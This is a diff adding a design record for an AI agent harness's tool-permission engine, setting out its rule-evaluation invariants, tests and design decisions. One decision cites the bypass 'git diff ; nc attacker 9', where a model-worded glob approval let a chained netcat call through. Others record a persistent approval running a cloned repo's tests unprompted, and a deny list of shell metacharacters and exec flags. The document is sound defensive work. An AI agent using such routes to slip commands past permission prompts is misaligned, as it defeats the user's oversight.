@@ -1,0 +1,129 @@
+primitive: harness.tool.permission
+summary: The tool-permission engine - Evaluate answers allow, ask or deny for a call from session, persistent ("Allow always") and profile rules, then the quiet-mode preset of read-only calls inside the working directory.
+code:
+  - framework/experimental/harness/tool/permission/
+docs:
+  - framework/docs/content/harness-architecture.md
+on_change:
+  - A new quiet-mode command or tool is checked for every way it can run a process, write a file or read outside the working directory before it joins the allow-list, and the docs' quiet-mode list changes with it.
+twins:
+  - job: Write a rule file owner-only through a temporary file and a rename, making its directory 0700.
+    why: Presets and persistent rules have different JSON wrappers and grew separately; nothing keeps them from one writer.
+    sites:
+      - path: framework/experimental/harness/tool/permission/persist.go
+        note: SavePreset.
+      - path: framework/experimental/harness/tool/permission/persistent.go
+        note: savePersistent.
+  - job: Map an answer's Decision to an allow, deny or ask Rule action and mint a literal rule.
+    why: AnswerToRuleWithPersist was added beside AnswerToRule for ScopeAlways and copied the mapping instead of calling a shared one.
+    sites:
+      - path: framework/experimental/harness/tool/permission/permission.go
+        note: AnswerToRule.
+      - path: framework/experimental/harness/tool/permission/persistent.go
+        note: AnswerToRuleWithPersist.
+  - job: The argv summary format, written by the dispatcher and parsed by quiet mode ("Read:<path>", "Ls:<path>", "Glob:<pattern> --root <dir>", "Grep:<pattern> --path <p> --glob <g>").
+    why: One package formats and another parses, with no shared type; a renamed flag on one side makes quiet mode ask, never allow.
+    sites:
+      - path: framework/experimental/harness/engine/tool_dispatch.go
+        note: FormatArgvSummary.
+      - path: framework/experimental/harness/tool/permission/quietpaths.go
+        note: quietPathsInside.
+invariants:
+  - id: rules-literal-unless-glob
+    rule: A rule matches its ArgvGlob as an exact string unless Glob is set, and every rule minted from an answer (AnswerToRule and AnswerToRuleWithPersist, ScopeAlways included) has Glob unset and survives a save and load unwidened.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestApprovalDoesNotWiden
+      - test: framework/experimental/harness/tool/permission.TestAnswerRuleMintsLiteral
+      - test: framework/experimental/harness/tool/permission.TestAllowAlwaysAnswerMintsLiteral
+      - test: framework/experimental/harness/tool/permission.TestPersistentRuleRoundTripStaysLiteral
+  - id: evaluation-order
+    rule: Evaluate takes the first matching rule from the session's rules, then persistent rules, then profile rules, so a session deny beats a wider persistent or profile allow.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestDenyBeatsWiderAllow
+      - test: framework/experimental/harness/tool/permission.TestSessionRuleApplies
+  - id: session-rules-stay-in-session
+    rule: A session rule decides calls of that session only.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestSessionRulesDoNotLeakAcrossSessions
+  - id: persistent-rule-in-its-dir
+    rule: AddPersistentRule stamps a rule with no Dir with WorkingDir, and Evaluate applies a persistent rule only while WorkingDir equals its Dir.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestAllowAlwaysStaysInItsWorkingDirectory
+  - id: strict-disables-quiet
+    rule: With StrictPermissions set, a call no rule decides is asked, whatever quiet mode would allow.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestStrictModeIgnoresQuietPreset
+  - id: quiet-bash-single-read-command
+    rule: Quiet mode allows a Bash command only when it holds none of ; & | backtick $ < > ( ) CR LF, starts with an allow-listed prefix ending at a word boundary, has no exec or write flag (find -exec, -ok, -delete, -fprint*, -fls; rg --pre, --hostname-bin; git --output; -o) in any quoted spelling, and runs git branch only to list.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestQuietModeRejectsChaining
+      - test: framework/experimental/harness/tool/permission.TestQuietAllowRequiresWordBoundary
+      - test: framework/experimental/harness/tool/permission.TestQuietAllowRejectsExecFlags
+      - test: framework/experimental/harness/tool/permission.TestQuietGitBranchListsOnly
+  - id: quiet-paths-under-working-dir
+    rule: Quiet mode allows a Read, Ls, Glob, Grep or path-reading Bash call only when every path, flag value, glob match and fixed glob prefix it reads resolves, symlinks followed, under the working directory, and asks for a leading ~, any .. segment, a $ or a path it cannot place.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestQuietModeAsksForReadsOutsideTheWorkingDir
+      - test: framework/experimental/harness/tool/permission.TestQuietModeAsksForDotDotThroughASymlink
+      - test: framework/experimental/harness/tool/permission.TestQuietModeAllowsReadsInsideTheWorkingDir
+  - id: rule-files-owner-only
+    rule: SavePreset and the persistent-rule save write files with no group or other permission bits, in directories created 0700.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestRuleFilesAreOwnerOnly
+  - id: promote-replaces-action
+    rule: Promote leaves one preset and profile rule per Tool, ArgvGlob and Glob, carrying the promoted rule's action, and removes the promoted rule from the session.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestPromoteDenyOverridesPresetAllow
+      - test: framework/experimental/harness/tool/permission.TestPromoteDeduplicates
+  - id: promote-keeps-the-decision
+    rule: Promote returns ErrPromotionShadowed and leaves the session rule, the preset file and the profile untouched when a persistent rule for WorkingDir, or a profile or saved-preset rule ahead of the promoted one, overlaps it with another action.
+    enforced_by:
+      - test: framework/experimental/harness/tool/permission.TestPromoteRefusesShadowedRule
+decisions:
+  - id: literal-by-default
+    date: 2026-11-18
+    status: accepted
+    decision: A rule's ArgvGlob is literal unless its author sets Glob, which only hand-written config does.
+    rejected:
+      - option: Treat every ArgvGlob as a filepath.Match pattern.
+        why: The model chooses the text the human approves, so approving "git diff *" also allowed "git diff ; nc attacker 9", and Allow always saved that to disk.
+    upholds: [rules-literal-unless-glob]
+  - id: persistent-rules-carry-dir
+    date: 2026-11-18
+    status: accepted
+    decision: An Allow always rule is stamped with the working directory it was granted in and applies only there; a rule saved with no Dir prompts again.
+    rejected:
+      - option: Apply persistent rules in every directory.
+        why: A summary leaves the directory implicit, so one approval of "go test ./..." in your own repo ran a cloned repo's tests with no prompt.
+    upholds: [persistent-rule-in-its-dir]
+  - id: quiet-mode-ignores-mutating
+    date: 2026-11-18
+    status: accepted
+    decision: The quiet-mode preset is checked by tool and argv shape, not by the tool's Mutating flag.
+    rejected:
+      - option: Auto-allow only tools that report Mutating false.
+        why: Bash reports mutating because it can mutate, which would make "git status" prompt every time.
+    upholds: [quiet-bash-single-read-command]
+  - id: globs-are-not-metachars
+    date: 2026-11-18
+    status: accepted
+    decision: The quiet-mode metacharacter refusal leaves out * ? and [, and checks a shell glob by the paths it matches in the working directory.
+    rejected:
+      - option: Refuse every glob character.
+        why: A glob expands in place and cannot start a second command, and refusing it would prompt for ordinary reads such as "find . -name *.go".
+    upholds: [quiet-bash-single-read-command, quiet-paths-under-working-dir]
+  - id: coarse-split-errs-toward-asking
+    date: 2026-11-18
+    status: accepted
+    decision: The exec-flag check splits the command on whitespace, so a quoted argument holding a space is checked as several words.
+    rejected:
+      - option: A full shell tokenizer for the flag check.
+        why: The coarse split only produces more words to check, so it can refuse more but never miss a flag, which is the safe direction for an allow with no human in the loop.
+    upholds: [quiet-bash-single-read-command]
+  - id: preset-json
+    date: 2026-11-18
+    status: accepted
+    decision: Permission presets are JSON files.
+    rejected:
+      - option: TOML presets.
+        why: Writing them would pull in a TOML writer beside the reader the harness already ships.
